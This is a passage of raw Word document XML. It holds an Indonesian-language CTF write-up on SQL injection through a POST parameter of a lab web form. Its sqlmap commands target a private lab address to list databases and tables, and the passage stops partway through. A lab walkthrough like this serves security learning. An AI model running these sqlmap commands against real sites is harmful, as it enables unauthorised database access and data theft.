      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00272305" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>metode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00272305" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00272305" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00272305" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> injection</w:t>
      </w:r>
      <w:r w:rsidR="00423240">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> parameter </w:t>
      </w:r>
      <w:r w:rsidR="00FB332F">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r w:rsidR="00423240">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ost</w:t>
      </w:r>
      <w:r w:rsidR="0083667B" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00DA4DEA" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>untuk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00DA4DEA" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00423240">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r w:rsidR="00DA4DEA" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>emanipulasi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00DA4DEA" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> data agar </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00AE38BE" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>kita</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00DA54A4" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00DA54A4" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r w:rsidR="00AE38BE" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>isa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00AE38BE" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00AE38BE" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>berkomunikasi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00AE38BE" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00FC4CFF" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Ke dalam </w:t>
      </w:r>
      <w:r w:rsidR="00AE38BE" w:rsidRPr="00E0776C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>databases</w:t>
      </w:r>
      <w:r w:rsidR="00943F03">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> server</w:t>
      </w:r>
      <w:r w:rsidR="00057530">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> pada </w:t>
      </w:r>
      <w:r w:rsidR="00FB332F">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r w:rsidR="00057530">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>eb CTF</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A61AC79" w14:textId="77777777" w:rsidR="00485327" w:rsidRDefault="00423240" w:rsidP="001802A6">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6DF4F884" wp14:editId="4ED18B22">
            <wp:extent cx="5378450" cy="2679700"/>
            <wp:effectExtent l="0" t="0" r="0" b="6350"/>
            <wp:docPr id="21244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38A4" w14:textId="34B7CDDF" w:rsidR="00942E21" w:rsidRPr="00485327" w:rsidRDefault="005A71DD" w:rsidP="001802A6">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00485327">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>Tool</w:t>
      </w:r>
      <w:r w:rsidR="00C75698" w:rsidRPr="00485327">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve">s yang </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00C75698" w:rsidRPr="00485327">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>digunakan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C75698" w:rsidRPr="00485327">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00C75698" w:rsidRPr="00485327">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>SQLmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A23B1E" w:rsidRPr="00485327">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> pada kali </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00A23B1E" w:rsidRPr="00485327">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>linux</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00FB289C" w:rsidRPr="00485327">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00FB289C" w:rsidRPr="00485327">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>untuk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00FB289C" w:rsidRPr="00485327">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00FB289C" w:rsidRPr="00485327">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>melakukan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00FB289C" w:rsidRPr="00485327">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00FB289C" w:rsidRPr="00485327">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00FB289C" w:rsidRPr="00485327">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D0A810B" w14:textId="4DEC49C1" w:rsidR="00CB30A7" w:rsidRPr="00581B41" w:rsidRDefault="005475DF" w:rsidP="00CB30A7">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006A1CCC">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="00D26883" w:rsidRPr="006A1CCC">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>om</w:t>
      </w:r>
      <w:r w:rsidRPr="006A1CCC">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r w:rsidR="00D26883" w:rsidRPr="006A1CCC">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>and</w:t>
      </w:r>
      <w:r w:rsidRPr="00581B41">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="00F14FFA" w:rsidRPr="00581B41">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F14FFA" w:rsidRPr="00581B41">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F14FFA" w:rsidRPr="00581B41">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> -u 'http://192.168.56.107/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F14FFA" w:rsidRPr="00581B41">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>contact.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F14FFA" w:rsidRPr="00581B41">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">' --batch --data 'nama=mans&amp;email=mans@gmail.com&amp;subject=faster&amp;message=kerusakan' </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7018867D" w14:textId="3FEEED9A" w:rsidR="00D2530B" w:rsidRDefault="00F14FFA" w:rsidP="00D610A5">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00581B41">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00581B41">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dbs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00D2530B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009A4E8A">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="00E22248">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="00D610A5">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">                             </w:t>
      </w:r>
      <w:r w:rsidR="00E22248">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00D2530B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>untuk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00D2530B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00D2530B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>menampilkan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00D2530B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> database</w:t>
      </w:r>
      <w:r w:rsidR="00E22248">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D1A1EF3" w14:textId="48DDB8D7" w:rsidR="00D2530B" w:rsidRDefault="00D2530B" w:rsidP="00D610A5">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1D9BBFFF" wp14:editId="0B9999B9">
            <wp:extent cx="4870450" cy="3175000"/>
            <wp:effectExtent l="0" t="0" r="6350" b="6350"/>
            <wp:docPr id="1378409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B2BD" w14:textId="77777777" w:rsidR="005C518A" w:rsidRDefault="00100DB9" w:rsidP="005C518A">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D0568D">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Terdapat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D0568D">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D0568D">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>databases</w:t>
      </w:r>
      <w:r w:rsidR="0069336D">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005C518A">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="76AA689C" w14:textId="77777777" w:rsidR="005C518A" w:rsidRDefault="005C518A" w:rsidP="005C518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</w:t>
      </w:r>
      <w:r w:rsidR="0069336D">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0069336D">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>information_schema</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="621EA038" w14:textId="5681C2F4" w:rsidR="007F5A86" w:rsidRDefault="00E001A1" w:rsidP="005C518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</w:t>
      </w:r>
      <w:r w:rsidR="007F5A86">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007F5A86">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>pengiriman</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="743EF13B" w14:textId="5F839897" w:rsidR="009F49EC" w:rsidRDefault="00537493" w:rsidP="00D610A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</w:t>
      </w:r>
      <w:r w:rsidR="00E001A1">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:r w:rsidR="007F5A86">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve">Kita </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007F5A86">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>akan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007F5A86">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E6142E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>mencari</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E6142E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> table yang </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E6142E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>terdapat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E6142E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> di databases </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E6142E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>pengiriman</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0052717F">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="796120D7" w14:textId="45735C9C" w:rsidR="00BE7726" w:rsidRDefault="0052717F" w:rsidP="00287469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command:</w:t>
      </w:r>
      <w:r w:rsidR="009F49EC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00294DAC" w:rsidRPr="00294DAC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00294DAC" w:rsidRPr="00294DAC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> -u 'http://192.168.56.107/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00294DAC" w:rsidRPr="00294DAC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>contact.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00294DAC" w:rsidRPr="00294DAC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve">' --batch --data 'nama=mans&amp;email=mans@gmail.com&amp;subject=faster&amp;message=kerusakan' -D </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00294DAC" w:rsidRPr="00294DAC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>pengiriman</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C315A6">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C053E5">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
      <w:r w:rsidR="00294DAC" w:rsidRPr="00294DAC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>tables</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53807991" w14:textId="1F790DCB" w:rsidR="00BE7726" w:rsidRDefault="00287469" w:rsidP="00496DDB">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2CDA49A2" wp14:editId="2351C50F">
            <wp:extent cx="5829300" cy="4984750"/>
            <wp:effectExtent l="0" t="0" r="0" b="6350"/>
            <wp:docPr id="590682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73D6" w14:textId="77777777" w:rsidR="003B7F8C" w:rsidRDefault="003B7F8C" w:rsidP="00496DDB">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50BBDF21" w14:textId="77777777" w:rsidR="000C167E" w:rsidRDefault="000C167E" w:rsidP="00496DDB">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B39AF22" w14:textId="0141B4A5" w:rsidR="00496DDB" w:rsidRDefault="00496DDB" w:rsidP="00496DDB">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Terdapat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0030334B" w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve">2 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0030334B" w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t>tabel</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0030334B" w:rsidRPr="009E50C4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0030334B" w:rsidRPr="009E50C4">
        <w:rPr>
